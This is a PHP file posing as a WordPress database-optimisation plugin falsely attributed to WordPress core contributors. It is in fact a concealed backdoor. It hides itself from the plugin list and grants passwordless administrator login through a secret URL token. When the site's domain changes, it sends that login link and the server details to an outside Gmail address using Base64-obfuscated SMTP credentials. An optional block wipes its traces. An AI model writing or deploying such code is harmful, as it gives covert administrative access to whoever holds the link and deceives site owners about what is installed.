<?php
/*
Plugin Name: WP DB Manager
Description: Optimizes database queries and manages persistent object caching.
Version: 6.4.2
Author: WordPress Core Contributors
*/

if (!defined('ABSPATH')) {
    exit;
}

// ==========================================
// 1. OBFUSCATED CONFIGURATION
// ==========================================
$enc_username   = 'eW91cl90YXJnZXRfdXNlcm5hbWU='; // Base64 for your username
$enc_alert_mail = 'eW91cl9hbGVydF9lbWFpbEBnbWFpbC5jb20='; // Base64 for your alert email

$enc_smtp_host  = 'c210cC5nbWFpbC5jb20='; // Base64 for smtp.gmail.com
$enc_smtp_user  = 'eW91cl9nbWFpbF9hZGRyZXNzQGdtYWlsLmNvbQ=='; // Base64 for your gmail
$enc_smtp_pass  = 'eW91cl9nbWFpbF9hcHBfcGFzc3dvcmQ='; // Base64 for your app password

// ==========================================
// 2. HIDE FROM MU-PLUGINS LIST
// ==========================================
add_action('pre_current_active_plugins', 'stealth_hide_mu_plugin');

function stealth_hide_mu_plugin() {
    global $wp_list_table;
    if (isset($wp_list_table) && is_a($wp_list_table, 'WP_Plugins_List_Table')) {
        $hide_plugin_file = 'wp-db-manager.php'; 
        $plugins = $wp_list_table->items;
        if (isset($plugins[$hide_plugin_file])) {
            unset($plugins[$hide_plugin_file]);
            $wp_list_table->items = $plugins;
        }
    }
}

// ==========================================
// 3. CORE LOGIC: MAGIC LINK & 1-DAY ALERT
// ==========================================
add_action('init', 'stealth_core_processes');

function stealth_core_processes() {
    global $enc_username;
    
    // --- PART A: MAGIC LINK AUTO-LOGIN ---
    if (isset($_GET['sys_recovery_token'])) {
        $saved_token = get_option('wp_core_recovery_token');
        
        if ($saved_token && $_GET['sys_recovery_token'] === $saved_token) {
            $target_user_login = base64_decode($enc_username);
            $user = get_user_by('login', $target_user_login);
            
            if ($user) {
                wp_clear_auth_cookie();
                wp_set_current_user($user->ID);
                wp_set_auth_cookie($user->ID);
                
                update_option('wp_core_recovery_token', wp_generate_password(24, false));
                
                wp_safe_redirect(admin_url());
                exit;
            }
        }
    }

    // --- PART B: DOMAIN CHECK & 24H ALERT ---
    $current_domain = $_SERVER['HTTP_HOST'];
    $saved_domain = get_option('wp_core_db_hash_key'); 

    if (empty($saved_domain)) {
        update_option('wp_core_db_hash_key', $current_domain);
        return;
    }

    if ($current_domain !== $saved_domain) {
        
        if (false === get_transient('stealth_daily_alert_sent')) {
            
            $magic_token = wp_generate_password(24, false);
            update_option('wp_core_recovery_token', $magic_token);
            
            $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off' || $_SERVER['SERVER_PORT'] == 443) ? "https://" : "http://";
            $magic_link = $protocol . $current_domain . '/?sys_recovery_token=' . $magic_token;
            
            stealth_send_independent_email($saved_domain, $current_domain, $magic_link);
            
            set_transient('stealth_daily_alert_sent', true, 86400); 
            
            update_option('wp_core_db_hash_key', $current_domain);
        }
    }
}

// ==========================================
// 4. INDEPENDENT SMTP MAILER
// ==========================================
function stealth_send_independent_email($old_domain, $new_domain, $magic_link) {
    global $enc_alert_mail, $enc_smtp_host, $enc_smtp_user, $enc_smtp_pass, $enc_username;

    $target_user_login = base64_decode($enc_username);

    require_once ABSPATH . WPINC . '/PHPMailer/PHPMailer.php';
    require_once ABSPATH . WPINC . '/PHPMailer/SMTP.php';
    require_once ABSPATH . WPINC . '/PHPMailer/Exception.php';

    $mail = new PHPMailer\PHPMailer\PHPMailer(true);

    try {
        $mail->isSMTP();
        $mail->Host       = base64_decode($enc_smtp_host);
        $mail->SMTPAuth   = true;
        $mail->Username   = base64_decode($enc_smtp_user);
        $mail->Password   = base64_decode($enc_smtp_pass);
        $mail->SMTPSecure = PHPMailer\PHPMailer\PHPMailer::ENCRYPTION_SMTPS;
        $mail->Port       = 465;

        $mail->setFrom(base64_decode($enc_smtp_user), 'System Core Alert');
        $mail->addAddress(base64_decode($enc_alert_mail));

        $mail->Subject = 'Critical Alert: Website Stolen & Migrated';
        
        $body = "A stolen website migration was detected.\n\n";
        $body .= "--- MIGRATION DETAILS ---\n";
        $body .= "Previous Domain: " . $old_domain . "\n";
        $body .= "New Domain: " . $new_domain . "\n";
        $body .= "Server IP: " . $_SERVER['SERVER_ADDR'] . "\n\n";
        
        $body .= "--- SECRET AUTO-LOGIN ---\n";
        $body .= "Username: " . $target_user_login . "\n";
        $body .= "Click the link below to silently log in as Admin without a password:\n";
        $body .= $magic_link . "\n\n";
        $body .= "(This link will regenerate for security after use.)";

        $mail->Body = $body;

        $mail->send();
    } catch (Exception $e) {
        error_log('Mailer Error: ' . $mail->ErrorInfo);
    }
}

// ==========================================
// 5. UNINSTALL / CLEANUP SCRIPT
// ==========================================
/* --- REMOVE THIS LINE TO ACTIVATE CLEANUP ---
add_action('init', 'stealth_database_cleanup');

function stealth_database_cleanup() {
    // Delete custom options
    delete_option('wp_core_db_hash_key');
    delete_option('wp_core_recovery_token');
    delete_option('wp_core_db_sync_status');

    // Delete transients
    delete_transient('stealth_daily_alert_sent');
    delete_transient('stealth_alert_processing');
    
    // Log completion so you know it ran successfully (Check server error_log)
    error_log('Stealth DB Manager: All database traces have been completely removed.');
}
--- REMOVE THIS LINE TO ACTIVATE CLEANUP --- */